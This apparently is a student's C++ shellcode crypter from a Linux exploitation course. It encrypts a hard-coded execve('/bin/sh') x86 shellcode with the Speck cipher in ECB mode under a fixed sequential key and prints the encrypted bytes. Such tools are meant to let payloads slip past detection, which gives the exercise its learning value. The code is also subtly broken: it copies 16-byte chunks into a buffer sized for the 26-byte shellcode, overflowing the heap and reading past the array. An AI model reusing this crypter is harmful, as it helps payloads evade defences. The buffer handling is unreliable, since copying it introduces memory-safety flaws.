// Student:   SLAE-755
#include <speck/speck.h>
#include <stdio.h>
#include <string.h>
#include <cstdlib>
#include <random>



static const uint8_t s_key_128256_stream[32] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
};

static const uint8_t shellcode[] = \
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


void generate_iv(uint8_t *iv, size_t iv_len) {
    std::random_device rd;  //Will be used to obtain a seed for the random number engine
    std::mt19937 gen(rd()); //Standard mersenne_twister_engine seeded with rd()
    std::uniform_int_distribution<> dis;

    for(int i=0; i<iv_len; i++) {
        iv[i] = static_cast<uint8_t>(dis(gen));
    }
}

void show_array(const char *explain, const uint8_t *array, size_t len) {
    printf("%20s ", explain);
    for(int i=0; i < len; i++) {
        printf("%02x ", array[i]);
    }
    printf("\n");
}

void show_shellcode(const char *explain, const uint8_t *array, size_t len) {
    printf("%20s ", explain);

    for(int i=0; i < len; i++) {
        printf("\\x%02x", array[i]);
    }
    printf("\n");
}


int main() {

    // ECB 128256 stream encrypt & decrypt
    {
        speck_ctx_t *ctx = speck_init(SPECK_ENCRYPT_TYPE_128_256, s_key_128256_stream, sizeof(s_key_128256_stream));
        if(!ctx) return 1;

        int i;
        size_t siz = sizeof(shellcode);
        uint8_t *plain_text = (uint8_t*) calloc(1, siz);


        int chunks = sizeof(shellcode)/16;
        if(siz % 16) chunks++;

        uint8_t *crypted_text   = (uint8_t*) calloc(1, chunks*16);
        uint8_t *decrypted_text = (uint8_t*) calloc(1, chunks*16);


        printf("chunks: %d\n", chunks);


        printf("ECB stream ph1 encryption\n");

        for(int i=0; i < chunks; i++){

	        //memcpy(plain_text, shellcode, sizeof(shellcode));
        	memcpy(plain_text+16*i, shellcode+16*i, 16);


	        show_array("plain text chunk:", plain_text+16*i, 16);

	        speck_ecb_encrypt(ctx, plain_text+16*i, crypted_text+16*i, 16);
	        show_array("encrypted chunk :", crypted_text+16*i, 16);

            //Show decrypted chunks
            speck_ecb_decrypt(ctx, crypted_text+16*i, decrypted_text+16*i, 16);
        	show_array("decrypted chunk :", decrypted_text+16*i, 16);

        }
        printf("\n");


        show_shellcode("plain text shellcode :", shellcode, sizeof(shellcode));
        show_shellcode("encrypted shellcode  :", crypted_text, chunks*16);

        printf("\n");




        free(decrypted_text);
        free(plain_text);


        speck_finish(&ctx);
    }


    return 0;
}

